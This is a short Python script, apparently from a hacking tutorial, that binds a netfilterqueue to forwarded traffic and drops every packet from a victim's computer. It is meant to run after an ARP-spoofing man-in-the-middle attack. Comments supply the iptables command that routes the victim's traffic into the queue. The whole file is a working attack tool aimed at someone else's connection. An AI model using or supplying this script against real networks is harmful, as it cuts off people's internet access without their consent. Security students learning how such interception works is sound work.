#!/usr/bin/env python
import netfilterqueue


#the purpose of this program is to drop or accept packets being sent from a victims computer to the internet. it is intended
#to be used after already being the Man in the middle from our arp_spoof program. To be able to access these packets,
#we must first put them in a queue using iptables. That command in the terminal is below:
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#When we are done, be sure to do iptables - flush to get rid of the iptables we created.



def process_packet(packet):
    print(packet)
    #We use packet.drop() to drop packets in the queue to cut the internet connection on the machine, or
    #alternatively packet.accept() to allow the victim pc to continue to the internet.
    packet.drop()

#creating an instance of a netfilterqueue object and putting it in a variable called queue. We then bind our new
#variable to the queue number we set up previously with iptables, and add a callback function we created called
#process_packet
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()